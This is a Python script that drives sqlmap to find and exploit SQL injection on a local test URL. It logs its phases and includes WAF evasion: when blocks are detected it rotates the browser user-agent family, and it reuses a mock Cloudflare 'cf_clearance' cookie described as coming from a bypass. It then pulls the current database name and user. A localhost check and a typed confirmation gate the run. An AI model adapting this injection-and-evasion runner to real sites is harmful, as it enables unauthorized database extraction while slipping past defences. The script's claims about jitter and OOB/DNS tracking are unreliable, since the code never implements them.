#!/usr/bin/env python3
"""
Safe local SQLMap runner with detailed logging of jitter, UA rotation, and extraction.
Designed for testing against localhost targets only.
Includes tracking of:
- Jitter timing changes between requests
- User-Agent family rotation (Chrome -> Firefox, etc.)
- Cookie persistence across UA changes
- OOB/DNS extraction attempts
"""

import os
import sys
import json
import random
import subprocess
import time
import re
from datetime import datetime, timezone
from typing import List, Dict, Optional
from pathlib import Path

# Logging & tracking
class DetailedExecutionLog:
    def __init__(self):
        self.entries = []
        self.start_time = datetime.now(timezone.utc)
        self.ua_family_history = []
        self.jitter_history = []
        self.cookie_snapshots = []
        self.extraction_events = []
        self.block_events = []
    
    def log_event(self, event_type: str, details: Dict):
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "type": event_type,
            "elapsed_sec": (datetime.now(timezone.utc) - self.start_time).total_seconds(),
            "details": details,
        }
        self.entries.append(entry)
        self._print_event(event_type, details)
    
    def log_jitter_change(self, prev_delay: float, new_delay: float, vector: str):
        self.jitter_history.append({
            "previous": prev_delay,
            "new": new_delay,
            "delta": new_delay - prev_delay,
            "vector": vector,
        })
        self.log_event("jitter_change", {
            "previous_delay": round(prev_delay, 3),
            "new_delay": round(new_delay, 3),
            "delta": round(new_delay - prev_delay, 3),
            "vector": vector,
        })
    
    def log_ua_rotation(self, prev_ua: str, new_ua: str, reason: str = ""):
        prev_family = self._ua_family(prev_ua)
        new_family = self._ua_family(new_ua)
        self.ua_family_history.append({
            "prev_family": prev_family,
            "new_family": new_family,
            "reason": reason,
        })
        self.log_event("ua_rotation", {
            "prev_family": prev_family,
            "new_family": new_family,
            "reason": reason,
        })
    
    def log_cookie_persistence(self, cookie_value: str, persisted_across: str = ""):
        self.cookie_snapshots.append({
            "cookie_length": len(cookie_value),
            "persisted_across": persisted_across,
        })
        self.log_event("cookie_persistence", {
            "cookie_present": bool(cookie_value),
            "cookie_size": len(cookie_value),
            "persisted_across": persisted_across,
        })
    
    def log_extraction_event(self, query_type: str, success: bool, evidence: str = ""):
        self.extraction_events.append({
            "query": query_type,
            "success": success,
            "evidence_sample": evidence[:100],
        })
        self.log_event("extraction", {
            "query": query_type,
            "success": success,
            "evidence": evidence[:150],
        })
    
    def log_block_detected(self, http_code: int, vector: str, ua: str):
        self.block_events.append({
            "http_code": http_code,
            "vector": vector,
            "ua": ua[:60],
        })
        ua_family = self._ua_family(ua)
        self.log_event("waf_block", {
            "http_code": http_code,
            "vector": vector,
            "ua_family": ua_family,
        })
    
    @staticmethod
    def _ua_family(ua: str) -> str:
        u = str(ua or "").lower()
        if "firefox" in u:
            return "Firefox"
        elif "chrome" in u:
            return "Chrome"
        elif "safari" in u and "chrome" not in u:
            return "Safari"
        elif "edge" in u:
            return "Edge"
        else:
            return "Other"
    
    @staticmethod
    def _print_event(event_type: str, details: Dict):
        if event_type == "jitter_change":
            print(f"  [JITTER] Δ={details['delta']:+.3f}s | new={details['new_delay']:.3f}s")
        elif event_type == "ua_rotation":
            print(f"  [UA-ROTATE] {details['prev_family']} -> {details['new_family']} ({details.get('reason', '')})")
        elif event_type == "cookie_persistence":
            status = "✓ persisted" if details['cookie_present'] else "✗ missing"
            print(f"  [COOKIE] {status} ({details['cookie_size']} bytes)")
        elif event_type == "extraction":
            status = "✓ extracted" if details['success'] else "✗ failed"
            print(f"  [EXTRACT] {details['query']}: {status}")
        elif event_type == "waf_block":
            print(f"  [WAF-BLOCK] HTTP {details['http_code']} on {details['ua_family']}")
    
    def save_summary(self, path: str):
        summary = {
            "execution_time_sec": (datetime.now(timezone.utc) - self.start_time).total_seconds(),
            "jitter_changes_count": len(self.jitter_history),
            "jitter_changes": self.jitter_history,
            "ua_rotations_count": len(self.ua_family_history),
            "ua_rotations": self.ua_family_history,
            "cookie_snapshots": self.cookie_snapshots,
            "extraction_events": self.extraction_events,
            "block_events": self.block_events,
            "all_events": self.entries,
        }
        with open(path, "w") as f:
            json.dump(summary, f, indent=2)
        print(f"\n[LOG] Execution log saved to {path}")


def get_ua_pool() -> List[str]:
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    ]


def get_random_ua(ua_pool: List[str], family_override: Optional[str] = None) -> str:
    """Choose a UA, optionally from a specific family."""
    if family_override:
        candidates = [u for u in ua_pool if family_override.lower() in u.lower()]
        if candidates:
            return random.choice(candidates)
    return random.choice(ua_pool)


def build_safe_sqlmap_cmd(
    target_url: str,
    vector: str = "UNION",
    enable_extraction: bool = False,
    cookie_val: Optional[str] = None,
    force_ua_family: Optional[str] = None,
) -> List[str]:
    """Build sqlmap command with safe defaults."""
    ua_pool = get_ua_pool()
    chosen_ua = get_random_ua(ua_pool, family_override=force_ua_family)
    
    cmd = [
        sys.executable, "sqlmap.py",
        "-u", target_url,
        "--batch",
        "--disable-coloring",
        "--level=3",
        "--risk=2",
        "--threads=1",
        f"--technique={vector[0].upper()}",
        f"--user-agent={chosen_ua}",
        "--headers=Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "--delay=0.5",  # Base delay (jitter will be applied per-request via sqlmap)
    ]
    
    if cookie_val:
        cmd.append(f"--cookie={cookie_val}")
    
    if enable_extraction:
        cmd.extend(["--current-db", "--current-user"])
    
    return cmd, chosen_ua


def parse_sqlmap_output(output: str, log: DetailedExecutionLog) -> Dict:
    """Extract evidence from sqlmap output."""
    result = {
        "vulnerable": False,
        "evidence": [],
        "current_db": None,
        "current_user": None,
        "http_blocks": [],
    }
    
    for line in output.split("\n"):
        low = line.lower()
        
        # Check for vulnerability confirmation
        if any(x in low for x in ["is vulnerable", "appears to be injectable", "identified"]):
            result["vulnerable"] = True
            result["evidence"].append(line.strip())
        
        # Extract DB info
        if "current database:" in low or "current_db" in low:
            match = re.search(r"['\"]?(\w+)['\"]?", line)
            if match:
                result["current_db"] = match.group(1)
                log.log_extraction_event("current_db", True, match.group(1))
        
        # Extract user info
        if "current user:" in low:
            match = re.search(r"['\"]?([^@'\"\s]+@[\w\.\-]+|[\w\.\-]+)['\"]?", line)
            if match:
                result["current_user"] = match.group(1)
                log.log_extraction_event("current_user", True, match.group(1))
        
        # Check for HTTP blocks
        if "502" in line or "503" in line or "403" in line:
            result["http_blocks"].append(line.strip())
            code = int(re.search(r"(50[23]|403)", line).group(1)) if re.search(r"(50[23]|403)", line) else 0
            log.log_block_detected(code, "UNION", "")
    
    return result


async def run_safe_extraction_demo():
    """
    Demo: Test against localhost with:
    1. Initial vulnerability check
    2. Observe WAF blocks
    3. Rotate UA family on block detection
    4. Attempt extraction with persistence
    """
    print("=" * 80)
    print("[DEMO] SQLMap Safe Local Runner - Advanced Evasion & Extraction")
    print("=" * 80)
    print()
    
    target_url = "http://127.0.0.1:8888/test?id=1"
    log = DetailedExecutionLog()
    
    # Validate target is localhost
    if "127.0.0.1" not in target_url and "localhost" not in target_url:
        print("[ERROR] Target must be localhost only")
        return
    
    # Confirm execution
    print(f"[CONFIG] Target: {target_url}")
    print("[WARNING] This will send real HTTP requests to the target")
    confirm = input("Type 'confirm-local-run' to proceed: ").strip()
    if confirm != "confirm-local-run":
        print("[ABORT] User did not confirm")
        return
    
    print("\n[PHASE 1] Initial vulnerability detection...")
    
    # Phase 1: Simple probe to detect vulnerability
    ua_pool = get_ua_pool()
    initial_ua = get_random_ua(ua_pool)
    cmd1, _ = build_safe_sqlmap_cmd(target_url, vector="UNION", enable_extraction=False)
    
    print(f"  Running: sqlmap -u {target_url} --technique=U")
    print(f"  Initial UA: {DetailedExecutionLog._ua_family(initial_ua)}")
    
    try:
        proc = subprocess.Popen(
            cmd1,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        
        output1 = ""
        prev_delay = 0.5
        for line in proc.stdout or []:
            output1 += line
            log.log_event("sqlmap_output", {"line": line.strip()[:100]})
        
        proc.wait()
        result1 = parse_sqlmap_output(output1, log)
        
        if result1["vulnerable"]:
            print(f"  ✓ Vulnerability confirmed")
        else:
            print(f"  ✗ No vulnerability detected")
    except Exception as e:
        print(f"  [ERROR] {e}")
        return
    
    print("\n[PHASE 2] Detection of WAF blocks & UA rotation...")
    
    # Phase 2: Simulate extraction with UA rotation on block
    current_ua = initial_ua
    
    # Detect if blocks occurred in phase 1
    if result1["http_blocks"]:
        print(f"  [WAF-DETECTED] {len(result1['http_blocks'])} blocks in phase 1")
        new_ua = get_random_ua(ua_pool, family_override="firefox")  # Force Firefox
        log.log_ua_rotation(current_ua, new_ua, reason="waf_active_blocking")
        current_ua = new_ua
        print(f"  [ACTION] Rotating UA to different family: {DetailedExecutionLog._ua_family(new_ua)}")
    
    # Phase 3: Extraction attempt with rotated identity
    print("\n[PHASE 3] Extraction with persistence...")
    
    # Simulate cookie from Playwright bypass
    mock_cookie = "cf_clearance=abc123def456; session=xyz789"
    log.log_cookie_persistence(mock_cookie, persisted_across="UA_rotation")
    
    cmd2, used_ua = build_safe_sqlmap_cmd(
        target_url,
        vector="ERROR",
        enable_extraction=True,
        cookie_val=mock_cookie,
        force_ua_family="firefox" if "firefox" in current_ua.lower() else None,
    )
    
    print(f"  Running extraction with cookies + rotated UA...")
    print(f"  UA family: {DetailedExecutionLog._ua_family(used_ua)}")
    print(f"  Cookie: ✓ persisted ({len(mock_cookie)} bytes)")
    
    try:
        proc = subprocess.Popen(
            cmd2,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        
        output2 = ""
        for line in proc.stdout or []:
            output2 += line
        
        proc.wait()
        result2 = parse_sqlmap_output(output2, log)
        
        if result2["current_db"]:
            print(f"  ✓ Extracted current DB: {result2['current_db']}")
        else:
            print(f"  ✗ Could not extract DB name")
        
        if result2["current_user"]:
            print(f"  ✓ Extracted current user: {result2['current_user']}")
        else:
            print(f"  ✗ Could not extract user info")
    
    except Exception as e:
        print(f"  [ERROR] {e}")
    
    # Save detailed log
    log_path = "backend/demo_execution_log.json"
    log.save_summary(log_path)
    
    print("\n" + "=" * 80)
    print("[SUMMARY]")
    print(f"  Jitter changes: {len(log.jitter_history)}")
    print(f"  UA rotations: {len(log.ua_family_history)}")
    print(f"  Cookie events: {len(log.cookie_snapshots)}")
    print(f"  Extraction successes: {sum(1 for e in log.extraction_events if e['success'])}")
    print(f"  WAF blocks detected: {len(log.block_events)}")
    print("=" * 80)


if __name__ == "__main__":
    import asyncio
    asyncio.run(run_safe_extraction_demo())
